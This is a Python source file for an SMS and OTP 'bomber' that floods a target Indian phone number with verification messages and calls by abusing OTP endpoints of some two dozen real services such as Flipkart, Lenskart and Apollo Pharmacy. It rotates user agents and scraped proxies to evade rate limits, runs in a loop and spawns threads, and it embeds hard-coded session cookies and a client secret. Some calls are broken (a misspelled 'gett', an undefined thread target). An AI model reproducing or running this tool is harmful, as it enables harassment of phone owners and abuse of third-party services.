import json
import random
import requests
import datetime, sys, time, argparse, os
import threading
class Bomber:

	def __init__(self, user_mobile, number_of_messege):
		self.user_mobile = user_mobile
		self.number_of_messege = number_of_messege
		self.acceptlanguage = "en-GB,en-US;q=0.9,en;q=0.8"

	def getUserAgent(self):
		with open('useragent.json') as f:
			data = json.load(f)
			user_agent_list =  data["user_agent"]
		userAgent = random.choice(user_agent_list)
		return userAgent


	def _checkinternet(self):
		try:
			requests.get("https://www.google.com")
			return True
		except:
			print("Check your internet connection and the modules")
			return False

	def getproxy(self):
		proxy_scrape_url = "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all"
		try:
			proxy_request = requests.get(proxy_scrape_url, Timeout =  10)
		except:
			return False
		proxylist =  proxy_request.text.split()
		return 'https://' + random.choice(proxylist)
	
	def flipkart(self):
		url = "https://rome.api.flipkart.com/api/7/user/otp/generate"
		flipkart_header = {
		"Accept": "*/*",
		"Accept-Encoding": "gzip, deflate, br",
		"Accept-Language": self.acceptlanguage,
		"Connection": "keep-alive",
		"Content-Length": "53",
		"Content-Type": "application/json",
		"DNT": "1",	
		"Host": "rome.api.flipkart.com",
		"Origin": "https://www.flipkart.com",
		"Referer": "https://www.flipkart.com/",
		"Sec-Fetch-Dest": "empty",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Site": "same-site",
		"User-Agent": self.getUserAgent(),
		"X-user-agent": self.getUserAgent() + " FKUA/website/42/website/Desktop"
		}
		try:
			request =  requests.post(url, data  = json.dumps( {"loginId":"+91" + self.user_mobile}) , headers = flipkart_header,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code ==  200 ):
			return True
			
			
	def urbanclap(self):
		url = "https://www.urbanclap.com/api/v2/growth/profile/generateOTP"
		urbanclap_header = {
		"Content-Type": "application/json"
		}
		data = '{"resend":false,"device_type":"android","country_id":"IND","phone":{"isd_code":"+91","phone_wo_isd":"'+self.user_mobile+'"},"source":"phone","device_id":"96c085562a102bc6","version_name":"7.4.47","version_code":"479","device_os":"android","version":1}'

		try:
			request = requests.post(url,headers=urbanclap_header,data=data,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True			
			
	def byjuss(self):
		url = "https://identity.tllms.com/api/request_otp?phone=%2B91-"+self.user_mobile+"&type=sms&app_client_id=12d13938-60f3-4a3e-ab56-ddadb86913a2"		
		try:
			request = requests.gett(url,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True						


	def byjus(self):
		url = "https://identity.tllms.com/api/request_otp?phone=%2B91-"+self.user_mobile+"&type=call&app_client_id=12d13938-60f3-4a3e-ab56-ddadb86913a2"		
		try:
			request = requests.gett(url,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True						
			
									
	def examby(self):
		url = "https://api.byjusexamprep.com/user/verify/sendOtp"
		examby_header = {
		"Content-Type": "application/json"
		}
		data = '{"tel":"+91'+self.user_mobile+'","viaWhatsapp":false}'

		try:
			request = requests.post(url,headers=examby_header,data=data,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True						
					
			
	def van(self):
		url = "https://www.vanheusenindia.com/register/customerRegisterOtpCheck?isAjax=true"
		van_header = {
		"Content-Type": "application/x-www-form-urlencoded"
		}
		data = "mobileoremail="+self.user_mobile+"&ajax=1&capillaryChk=0&capillaryCustEmail=&firstname=TANMAbnj%2Bjj&dob=2002-01-15&gender-radio=1&email=tanmar133%2540gmail.com&mobile=&password=Sluf68%2540%2540%2524"

		try:
			request = requests.post(url,headers=van_header,data=data,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True
						
												
	def flip(self):
		url = "https://1.rome.api.flipkart.com/1/action/view"
		flip_header = {
		"Connection":  "keep-alive",
		"Content-Length": "268",
		"X-user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36 FKUA/msite/0.0.3/msite/Mobile",
		"Content-Type": "application/json",
		"sec-ch-ua-mobile": "?1",
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36",
		"Accept": "*/*",
		"Origin": "https://www.flipkart.com",
		"Sec-Fetch-Site": "same-site",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://www.flipkart.com/",
		"Accept-Encoding": "gzip, deflate, br",
		"Accept-Language": self.acceptlanguage,
		"Cookie": "T=cl0rsv2jugjfl0a5r2nsxnmllBR%3A.1647328511658; vh=750; vw=393; dpr=2.75; _pxvid=a80e6ea6-a42f-11ec-9ca7-4f7758745a55; Network-Type=wifi; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; SN=VI1EB9099035C4499AAE779D4C41953370.TOKBB8D87A5752B4148B43910BDE38CD67A.1651227482.LO; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C19112%7CMCMID%7C35833481230815591360851946895951129453%7CMCAAMLH-1648564735%7C12%7CMCAAMB-1651227479%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1651234683s%7CNONE%7CMCAID%7CNONE; S=d1t14PxJIHz8/Pyo/KFI/dng/P9huSMZf15kEOjXnuIUXCinV65q+OsSS3IpSi3VwF+r01NfWUfm0TBQnCxy3gGvcmQ==; gpv_pn=LOGIN_V4_MOBILE; gpv_pn_t=dynamic; s_sq=flipkart-mob-web%3D%2526pid%253DLOGIN_V4_MOBILE%2526pidt%253D1%2526oid%253Dfunctiongr%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DSUBMIT"
		}
		data = '{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"'+self.user_mobile+'","clientQueryParamMap":{"ret":"/","entryPage":"HEADER_ACCOUNT"},"loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}}'
		try:
			request = requests.post(url,headers=flip_header,data=data,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True
			
			
			
	def etiko(self):
		url = "https://eatiko.com/public/api/custom-otp-user"
		etiko_header = {
		"Content-Type": "application/json"
		}
		data ='{"phone":"'+self.user_mobile+'"}'
		try:
			request = requests.post(url,headers=etiko_header,data=data,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True						
			
			
												
	def khatabook(self):
		url = "https://api.khatabook.com/v1/auth/request-otp"
		khatabook_header = {
		"Content-Type": "application/json"
		}
		data ='{"app_signature":"wk+avHrHZf2","country_code":"+91","phone":"'+self.user_mobile+'"}'
		try:
			request = requests.post(url,headers=khatabook_header,data=data,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True

	def moglix(self):
		url = "https://api.moglix.com/login/sendOTP"
		moglix_header = {
		"Content-Type": "application/json"
		}
		data='{"type":"p","phone":"'+self.user_mobile+'","email":"","source":"signup","device":"app"}'
		try:
			request = requests.post(url,headers=moglix_header,data=data,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True
									

	def medibuddy(self):
		url = "https://loginprod.medibuddy.in/user/register"
		med_header = {
		"Content-Type": "application/json"
		}
		data = '{"advertiserId":"8fc39469-f550-4026-8d56-9255e05cb618","phonenumber":"'+self.user_mobile+'","platform":"Android"}'
		try:
			request = requests.post(url,headers=med_header,data=data,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True
			
			
	def allen(self):
		url = "https://www.allensolly.com/capillarylogin/customerRegisterOtpCheck?isAjax=true"
		allen_header = {
		"Content-Type": "application/x-www-form-urlencoded"
		}
		data = "mobileoremail="+self.user_mobile+"&ajax=1&capillaryChk=0&capillaryCustEmail=&firstname=Op%2Bjjh&dob=04%252F01%252F2000&gender-radio=1&mobile=&email=Baiokfhjh%2540gmail.com&registerPassword=Sljgh57%2540%2540"
		try:
			request = requests.post(url,headers=allen_header,data=data,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True


	def barbe(self):
		url = "https://api.barbequenation.com/api/v1/generate-otp"
		barbe_header = {		
		"Host": "api.barbequenation.com",
		"bbq-client-id": "86d5f331-6e0d-41e9-926f-a18bb1b94f9f",
		"bbq-client-secret": "2CDB:w6H#a",
		"Content-Type": "application/json",
		"content-length": "61",
		"accept-encoding": "gzip",
		"user-agent": "okhttp/4.9.3"
		}
		data = '{"country_code":"+91","mobile_number":'+self.user_mobile+',"otp_id":""}'
		try:
			request = requests.post(url,headers=barbe_header,data=data,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True
			
			
			

	def confirmtkt(self):
		url = "https://api.zepto.co.in/api/v1/user/customer/send-otp-sms/"
		zepto_header = {
		"Content-Type": "application/json"
		}
		data = '{"mobileNumber":"'+self.user_mobile+'"}'
		try:
			request = requests.post(url,headers=zepto_header,data=data,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True


	def lenskart(self):
		url = "https://api.lenskart.com/v2/customers/sendOtp"
		lenskat_header = {
			"accept": "application/json, text/plain, */*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"content-length": "26",
			"content-type": "application/json;charset=UTF-8",
			"dnt": "1",
			"origin": "https://www.lenskart.com",
			"referer": "https://www.lenskart.com/",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-site",
			"user-agent": self.getUserAgent(),
			"x-api-client": "desktop",
			"x-b3-traceid": "991589389250988",
			"x-session-token": "85d09926-3a73-4dbe-9f30-86b9f29f4a67"
			}
		try:
			request = requests.post(url, data=json.dumps({"telephone":self.user_mobile}),headers = lenskat_header,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True

	def justdial(self):
		url = "https://www.justdial.com/functions/whatsappverification.php"
		justdial_header = {
			"accept": "*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"content-length": "38",
			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
			"origin": "https://www.justdial.com",
			"referer": "https://www.justdial.com/",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.getUserAgent(),
			"x-requested-with": "XMLHttpRequest",
		}
		try:
			r = requests.post(url, data="mob="+ self.user_mobile +"&vcode=&rsend=0&name=deV", headers=justdial_header,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(r.status_code==200):
			return True

	def indialends(self):
		url = "https://indialends.com/internal/a/otp.ashx"
		indialends_header = {
			"accept": "*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"Connection": "keep-alive",
			"content-length": "26",
			"content-type": "application/x-www-form-urlencoded",
			"dnt": "1",
			"Host": "indialends.com",
			"origin": "https://www.indialends.com",
			"referer": "https://www.indialends.com/",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.getUserAgent(),
			"x-requested-with": "XMLHttpRequest",
		}
		try:
			r = requests.post(url, data="log_mode=1&ctrl="+self.user_mobile, headers=indialends_header,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(r.status_code==200):
			return True

	def apolopharmacy(self):
		url = "https://www.apollopharmacy.in/sociallogin/mobile/sendotp"
		apolopharmacy_header = {
			"accept": "*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"Connection": "keep-alive",
			"content-length": "17",
			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
			"dnt": "1",
			"origin": "https://www.apollopharmacy.in",
			"referer": "https://www.apollopharmacy.in/",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.getUserAgent(),
			"x-requested-with": "XMLHttpRequest",
		}
		try:
			request = requests.post(url, data="mobile=" + self.user_mobile, headers=apolopharmacy_header,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if (request.status_code == 200):
			return True

	def magicbrick(self):
		url = "https://accounts.magicbricks.com/userauth/api/validate-mobile"
		magicbrike_header = {
			"accept": "application/json, text/javascript, */*; q=0.01",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"content-length": "20",
			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
			"dnt": "1",
			"origin": "https://accounts.magicbricks.com",
			"referer": "https://accounts.magicbricks.com/userauth/login",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.getUserAgent(),
			"x-requested-with": "XMLHttpRequest"
		}
		try:
			request = requests.post(url, data="ubimobile="+ self.user_mobile, headers=magicbrike_header,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True

	def ajio(self):
		url = "https://login.web.ajio.com/api/auth/generateLoginOTP"
		ajio_header = {
			"accept": "application/json     ",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"Connection": "keep-alive",
			"content-length": "29",
			"content-type": "application/json",
			"Host": "login.web.ajio.com",
			"dnt": "1",
			"origin": "https://www.ajio.com",
			"referer": "https://www.ajio.com/",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-site",
			"user-agent": self.getUserAgent()
		}
		try:
			request = requests.post(url, data=json.dumps({"mobileNumber": self.user_mobile}), headers=ajio_header,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if (request.json()['success']):
			return True
		return False


	def mylescars(self):
		url = "https://www.mylescars.com/usermanagements/chkContact"
		myle_header = {
			"accept": "application/json",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"content-length": "20",
			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
			"dnt": "1",
			"origin": "https://www.mylescars.com",
			"referer": "https://www.mylescars.com/",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.getUserAgent(),
			"x-requested-with": "XMLHttpRequest"
		}
		try:
			request = requests.post(url, data="contactNo="+ self.user_mobile, headers=myle_header,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True

	def unacademy(self):
		url = "https://unacademy.com/api/v1/user/get_app_link/"
		unac_header = {
			"accept": "application/json",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": self.acceptlanguage,
			"Connection": "keep-alive",
			"content-length": "107",
			"content-type": "application/json",
			"dnt": "1",
			"origin": "https://unacademy.com",
			"referer": "https://unacademy.com",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.getUserAgent()
		}
		try:
			request = requests.post(url, data=json.dumps({"phone": self.user_mobile}), headers=unac_header,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==200):
			return True

	def snapdeal(self):
		url = "https://www.snapdeal.com/sendOTP"
		snapdeal_head = {
			"accept": "*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
			"content-length": "62",
			"content-type": "application/x-www-form-urlencoded",
			"DNT": "1",
			"Host": "www.snapdeal.com",
			"origin": "https://www.snapdeal.com",
			"referer": "https://www.snapdeal.com/iframeLogin",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.getUserAgent(),
			"X-Requested-With": "XMLHttpRequest"
		}
		try:
			request = requests.post(url, data="emailId=&mobileNumber="+ self.user_mobile + "&purpose=LOGIN_WITH_MOBILE_OTP",headers=snapdeal_head,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if (request.json()['status'] == "fail"):
			return False
		return True

	def jiomart(self):
		url = "https://www.jiomart.com/mst/rest/v1/id/details/" + self.user_mobile
		jiomart_header = {
			"accept": "application/json, text/plain,*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
			"dnt": "1",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"user-agent": self.getUserAgent(),
			"referer": "https://www.jiomart.com/customer/account/login"
		}
		try:
			request = requests.get(url, headers = jiomart_header,proxies={ 'https' : self.getproxy()})
		except:
			return False
		if(request.status_code==400):
			return True
	


	def startBombing(self):
		if(self._checkinternet()):
			counter = 0
			while True:
				if self.flipkart():
					counter+=1
				if self.van():
					counter+=1
				if self.urbanclap():
					counter+=1				
				if self.byjuss():
					counter+=1	
				if self.byjus():
					counter+=1												
				if self.examby():
					counter+=1							
				if self.flip():
					counter+=1		
				if self.etiko():
					counter+=1
				if self.khatabook():
					counter+=1	
				if self.moglix():
					counter+=1										
				if self.medibuddy():
					counter+=1	
				if self.allen():
					counter+=1										
				if self.barbe():
					counter+=1								
				if self.confirmtkt():
					counter+=1
				if self.lenskart():
					counter+=1
				if self.justdial():
					counter+=1
				if self.indialends():
					counter+=1
				if self.apolopharmacy():
					counter+=1
				if self.magicbrick():
					counter+=1
				if self.apolopharmacy():
					counter+=1
				if self.magicbrick():
					counter+=1
				if self.mylescars():
					counter+=1
				if self.unacademy():
					counter+=1
				if self.snapdeal():
					counter +=1
				if self.jiomart():
					counter +=1
				if(counter >= self.number_of_messege):
					break

			#["flipkart","confirmtkt","lenskart","justdial","indialends","apolopharmacy","magicbrick","ajio","mylescars","unacademy","snapdeal", "jiomart"]:
		else:
			print("possible errors -  Internet connectivity")
# Create a shared variable for thread counts
thread_num = 0
thread_num_mutex = threading.Lock()
num_requests = 20
# Spawn a thread per request
all_threads = []
for i in range(num_requests):
    t1 = threading.Thread(target=sent)
    t1.start()
    all_threads.append(t1)

for current_thread in all_threads:
    current_thread.join()  # Make the main thread wait for the children threads



#shiprocketsocial,valueshoppe,housing.com,hoststar,byju,altbalaji,